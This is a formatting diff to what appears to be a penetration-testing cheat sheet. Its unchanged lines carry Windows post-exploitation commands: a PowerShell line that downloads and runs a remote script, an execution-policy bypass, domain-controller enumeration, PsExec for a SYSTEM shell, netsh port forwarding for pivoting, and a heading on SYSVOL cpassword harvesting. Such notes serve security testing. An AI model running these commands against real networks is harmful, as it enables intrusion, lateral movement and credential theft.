@@ -193,9 +193,10 @@ IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
-##Powershell identify Domain Controler
+## Powershell identify Domain Controler
 
 [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
+
 
 ## Powershell identify server 2003 in the current domain 
 
@@ -209,7 +210,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 
  PSEXEC -i -s -d CMD
 
-##Port forwarding 
+## Port forwarding 
 netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
 
 ## Check cpassword in SYSVOL
